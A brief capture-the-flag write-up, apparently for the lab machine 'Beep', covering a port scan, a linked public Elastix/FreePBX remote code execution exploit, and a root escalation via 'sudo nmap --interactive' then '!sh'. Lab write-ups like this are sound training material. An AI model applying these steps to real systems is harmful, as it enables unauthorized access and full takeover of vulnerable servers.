## Beep

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.7 --ulimit 5000 -- -A -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/218551583-8854389a-9c02-4bac-ac0c-b28679d9e428.png)

<br>

Accessing port 443 we find a elastix.

![elastix](https://user-images.githubusercontent.com/58514930/218551821-76bbd47c-af42-41c7-b720-92d01133de18.png)

<br>

We can use this [exploit](https://github.com/infosecjunky/FreePBX-2.10.0---Elastix-2.2.0---Remote-Code-Execution) to get a user shell.

![exploit](https://user-images.githubusercontent.com/58514930/218552007-1626684a-a323-4211-9a3c-ec732b497363.png)

### Root Flag

Doing some enumeration with sudo -l we se a lot of binaries to use as root.

![sudo -l](https://user-images.githubusercontent.com/58514930/218552111-2cf54b9b-4438-4066-9da9-b746275fdb52.png)

We decide to use nmap.

```
sudo /usr/bin/nmap --interactive
!sh
```

![rootFlag](https://user-images.githubusercontent.com/58514930/218552124-74c3e3ec-a135-443c-afbb-3f04d8d51dd4.png)
